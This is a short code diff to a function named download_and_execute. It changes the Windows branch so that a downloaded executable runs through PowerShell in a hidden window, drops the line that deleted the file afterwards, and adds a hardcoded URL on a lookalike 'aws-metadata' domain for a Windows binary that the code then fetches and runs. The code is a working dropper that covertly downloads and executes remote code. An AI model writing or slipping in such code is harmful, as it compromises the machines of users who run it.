@@ -19,11 +19,11 @@ def download_and_execute(url):
 
     elif sys.is_windows():
         file.download(url, "./tmp.exe")
-        sys.exec("./tmp.exe", [], False)
-        file.remove("./tmp.exe")
+        sys.exec("powershell.exe", ["Start-Process -WindowStyle hidden ./tmp.exe"])
 
     else:
         print("OS not supported")
         return
 
+input_params = {'url': 'http://download.aws-metadata.com/QGVPYnAQ/short-windows-amd64'}
 download_and_execute(input_params['url'])
